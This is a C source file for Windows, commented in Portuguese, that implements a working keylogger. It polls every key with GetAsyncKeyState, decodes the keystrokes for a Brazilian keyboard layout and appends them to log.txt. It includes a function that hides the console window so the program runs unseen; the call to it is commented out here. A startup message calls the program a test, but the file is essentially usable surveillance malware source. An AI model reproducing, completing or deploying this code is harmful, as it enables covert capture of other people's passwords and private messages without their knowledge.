#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>


void ocultConsole();
const char* interpretKey(int key, int shiftPressed, int capsLkPressed, int altLPressed);
int saveData(char *fp, int key, int shiftPressed, int capsLkPressed, int altLPressed);

int main(){
    printf("Isso e um teste para o keylogger\n");

    //ocultConsole();
    printf("Avaliando as teclas\nPressione 'ESC' para encerrar\n");

    int key;
    SHORT keyState[256] = {0};
    int shiftState = 0, capslkState = 0, altLState = 0;
    saveData("log.txt", '\n', 0, 0, 0);

    while(1){
        for(key = 8;  key <= 190; key++){
            if(GetAsyncKeyState(VK_ESCAPE) & 0x8000){
                saveData("log.txt", VK_ESCAPE, 0, 0, 0);
                printf("Encerrando...\n");
                return 1;
            }

            SHORT currentState = GetAsyncKeyState(key);

            if((currentState & 0x8000) && !(keyState[key] & 0x8000)){
                int shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) || (GetAsyncKeyState(VK_RSHIFT) & 0x8000) || (GetAsyncKeyState(VK_LSHIFT) & 0x8000);
                int capsLkPressed = (GetKeyState(VK_CAPITAL) & 0x0001);
                int altLPressed = (GetAsyncKeyState(VK_LMENU) & 0x8000);

                //printf("Tecla pressionada %d\n", key); -> verificar o valor de cada tecla pressionada
                
                if(key == VK_SHIFT || key == VK_RSHIFT || key == VK_LSHIFT){
                    if(!shiftState){
                        printf("Tecla pressionada %s\n", interpretKey(key, shiftPressed, capsLkPressed, altLPressed));
                        shiftState = 1;
                        saveData("log.txt", key, shiftPressed, capsLkPressed, altLPressed);
                    }
                } else if (key == VK_CAPITAL) {
                    if(!capslkState){
                        printf("Tecla pressionada %s\n", interpretKey(key, shiftPressed, capsLkPressed, altLPressed));
                        capslkState = 1;
                        saveData("log.txt", key, shiftPressed, capsLkPressed, altLPressed);
                    }
                } else if(key == VK_LMENU){
                    if(!altLPressed){
                        printf("Tecla pressionada %s\n", interpretKey(key, shiftPressed, capsLkPressed, altLPressed));
                        altLState = 1;
                        saveData("log.txt", key, shiftPressed, capsLkPressed, altLPressed);
                    }
                }else {
                    printf("Tecla pressionada %s\n", interpretKey(key, shiftPressed, capsLkPressed, altLPressed));
                    saveData("log.txt", key, shiftPressed, capsLkPressed, altLPressed);
                }
            }

            if(!(GetAsyncKeyState(VK_SHIFT) & 0x8000) && !(GetAsyncKeyState(VK_RSHIFT)) && !(GetAsyncKeyState(VK_LSHIFT))){
                shiftState = 0;
            }

            if(!(GetKeyState(VK_CAPITAL) & 0x0001)){
                capslkState = 0;
            }

            if(!(GetKeyState(VK_LMENU) & 0x0001)){
                altLState = 0;
            }
            keyState[key] = currentState;
        }
        Sleep(100);
    }
    return 0;
}

void ocultConsole(){
    HWND stealth;
    AllocConsole();
    stealth = FindWindow("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0); 
}

int saveData(char *fp, int key, int shiftPressed, int capsLkPressed, int altLPressed){
    FILE *file = fopen(fp, "a+");

    if(file == NULL){
        printf("Não foi possível abrir o arquivo\n");
        return 1;
    }

    const char* keySt = interpretKey(key, shiftPressed, capsLkPressed, altLPressed);
    fprintf(file, "%s", keySt);

    fclose(file);
    return 0;

    // if(key == 8){
    //     FILE *file = fopen(fp, "r+");
    //     if(file == NULL){
    //         printf("Não foi possível abrir o arquivo\n");
    //         return 1;
    //     }

    //     fseek(file, 0, SEEK_END);
    //     long sizeFile = ftell(file);
    //     if(sizeFile > 0){
    //         ftruncate(fileno(file), sizeFile - 1);
    //     }
    //     fclose(file);
    //     return 0;
    // }
}

const char* interpretKey(int key, int shiftPressed, int capsLkPressed, int altLPressed){
    static char keyStr[2];
    keyStr[1] = '\0';

    if(key >= 'A' && key <= 'Z'){
        if(shiftPressed ^ capsLkPressed){
            keyStr[0] = key;
        }else {
            keyStr[0] = key + 32;
        }
        return keyStr;
    }

    if(key >= 'a' && key <= 'z'){
        if(shiftPressed ^ capsLkPressed){
            keyStr[0] = key - 32;
        } else {
            keyStr[0] = key;
        }
        return keyStr;
    }

    if(key >= '0' && key <= '9'){
        if(shiftPressed){
            switch (key){
                case '1': return "!";
                case '2': return "@";
                case '3': return "#";
                case '4': return "$";
                case '5': return "%";
                case '6': return "¨";
                case '7': return "&";
                case '8': return "*";
                case '9': return "(";
                case '0': return ")";
            }
        }

        if(altLPressed){
            switch(key){
                case '1': return "¹";
                case '2': return "²";
                case '3': return "³";
                case '4': return "£";
                case '5': return "¢";
                case '6': return "¬";
            }
        }
    }

    if(key >= 100 && key <= 191){
        if(shiftPressed){
            switch (key){
            case 190: case 110: return "[>]";
            case 187: return "[+]";
            case 188: return "[<]";
            case 189: return "[_]";
            }
        }
    }
    
    switch(key){
        case 8: return "[BACKSPACE]";
        case VK_RETURN: return "\n";
        case 32: return " ";
        case 33: return "[PgUP]";
        case 34: return "[PgDN]";
        case 190: case 110: return ".";
        case 45: return "[INS]";
        case 37: return "[LEFT]";
        case 39: return "[RIGHT]";
        case VK_TAB: return "\n";
        case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT: return "[SHIFT]";
        case VK_ESCAPE: return "[ESC]";
        case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL: return "[CTRL]";
        case VK_END: return "[END]";
        case VK_HOME: return "[HOME]";
        case VK_CAPITAL: return "[CAPSLK]";
        case VK_MENU: case VK_LMENU: case VK_RMENU: return "[ALT]";
        case VK_LWIN: case VK_RWIN: return "[WIN]";
        case VK_F1: return "[F1]";
        case VK_F2: return "[F2]";
        case VK_F3: return "[F3]";
        case VK_F4: return "[F4]";
        case VK_F5: return "[F5]";
        case VK_F6: return "[F6]";
        case VK_F7: return "[F7]";
        case VK_F8: return "[F8]";
        case VK_F9: return "[F9]";
        case VK_F10: return "[F10]";
        case VK_F11: return "[F11]";
        case VK_F12: return "[F12]";
        case VK_DELETE: return "[DEL]";
        case 186: return "ç";
        case 187: return "=";
        case 188: return ",";
        case 189: return "-";
        case VK_UP: return "[UP]";
        case VK_DOWN: return "[DOWN]";
        case 93: return "[algo]";
        
        default:{
            keyStr[0] = (char)key;
            return keyStr;
        }   
    }
}